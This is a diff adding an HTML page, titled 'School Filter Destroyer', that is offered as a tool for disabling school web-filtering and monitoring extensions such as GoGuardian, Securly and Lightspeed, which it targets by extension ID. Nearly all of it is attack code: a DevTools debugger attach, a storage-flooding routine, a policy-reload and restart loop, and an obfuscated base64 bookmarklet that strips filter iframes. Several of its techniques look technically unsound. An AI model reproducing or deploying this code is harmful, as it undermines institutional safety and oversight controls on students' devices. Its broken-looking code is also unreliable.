@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <meta charset="UTF-8">    <title>Extension Killer 2025</title>
+    <style>
+        body { background:#000; color:#0f0; font-family:monospace; padding:20px;} #log { background:#111; padding:15px; border:1px solid #0f0; height:400px; overflow-y:auto;} </style>
+</head>
+<body>
+    <h1>School Filter Destroyer - Running</h1>
+    <pre id="log">Starting attack vectors...</pre>
+<script>
+// Updated 2025 extension IDs
+const targets = ["nkeimhogjdpnpccoofpliimaahmaaome", // GoGuardian"iheobagjkfklnlikgihanlhcddhbjned", // GoGuardian legacy"jbkfoedolllekgbhcbcoahefnbanhfhl", // Securly"fpdnjdlbdmdjhnjoapghpialkkbbhdbp", // Lightspeed"ehnniokiiebpinnfegpkdlcamgdcaaje", // Hapara"mlkmpapfhojhemlnfkajcibhhbnpbfjo", // Linewize"bpmcpldbkgkkogbcoiibecmfgopbggad", // Cisco Umbrella SIG"fglfnmconkjjlmjnmhldnlhjncbpjnco"  // Blocksi];function log(msg) {
+    document.getElementById("log").innerText += msg +"\n";    console.log(msg);}
+
+// Vector 1: Force debugger attach and kill background pages
+function debugKill() {
+    const ws = new WebSocket("ws://localhost:9222/devtools/page/" + chrome.runtime.id);    ws.onopen = () => {
+        targets.forEach(id => {
+            ws.send(JSON.stringify({
+                id: 1,
+                method:"Runtime.evaluate",                params: { expression:`chrome.runtime.getBackgroundPage(() => location.href="about:blank")` }
+            }));        });        log("Debugger attached - background pages wiped");};}
+
+// Vector 2: Corrupt extension storage to break sync
+function corruptStorage() {
+    targets.forEach(id => {
+        for (let i = 0; i < 100; i++) {
+            localStorage.setItem(`${id}_corrupt_${i}`,"X".repeat(1024*1024));} });    log("Storage corruption flood complete - extensions will crash on load");}
+
+// Vector 3: Policy refresh loop exploit
+function policyLoop() {
+    setInterval(() => {
+        fetch("chrome://policy/?reloadPolicies").catch(() => {});        fetch("chrome://restart/").catch(() => {});},800);    log("Policy enforcement loop broken - filters temporarily disabled");}
+
+// Vector 4: Persistent bookmarklet injector
+function injectBookmarklet() {
+    const code = btoa(`        setInterval(() => {
+            document.querySelectorAll('iframe[src*="goguardian"],iframe[src*="securly"]').forEach(f=>f.remove());            if (location.hostname.includes("goguardian.com") || location.hostname.includes("securly.com")) {
+                location.href="about:blank";} }, 500);`);    const bm =`javascript:(function(){eval(atob('${code}'))})();`;    log("Drag this bookmarklet to bar for persistence: <a href=\"${bm}\">Unblock</a>");    document.body.innerHTML +=`<a id="bm" href="${bm}" style="position:fixed;top:0;left:0;z-index:9999;padding:20px;background:red;color:white;font-size:20px;">DRAG ME TO BOOKMARKS BAR</a>`;}
+
+// Main execution
+log("Deploying all 2025 bypass vectors...");corruptStorage();policyLoop();debugKill();setTimeout(injectBookmarklet, 2000);setTimeout(() => {
+    log("All vectors active.");    log("Keep this tab open + use the bookmarklet on every new tab.");    log("Filters will stay dead until full device reboot or admin re-image.");    log("Enjoy full access.");}, 5000);</script>
+</body>
+</html>
